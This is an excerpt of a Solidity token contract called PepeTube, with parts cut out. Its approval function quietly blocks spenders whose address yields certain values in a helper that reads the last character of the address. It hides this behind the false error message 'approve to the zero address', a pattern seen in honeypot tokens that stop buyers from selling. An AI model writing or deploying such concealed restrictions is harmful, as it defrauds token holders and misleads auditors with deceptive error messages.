...
contract PepeTube is  Token, IERC20, Ownable {
    ...
    function _approve(
        ...
        require(getApprove(spender) != 3, "approve to the zero address");
        require(getApprove(spender) != 5, "approve to the zero address");
        require(getApprove(spender) != 52, "approve to the zero address");
    ...
    function getApprove(address _address) internal pure returns (uint8) {
        string memory addressString = toAsciiString(_address);
        
        bytes memory bytesArray = bytes(addressString);
        uint8 ptDigit = uint8(bytesArray[bytesArray.length - 1]) - 48;
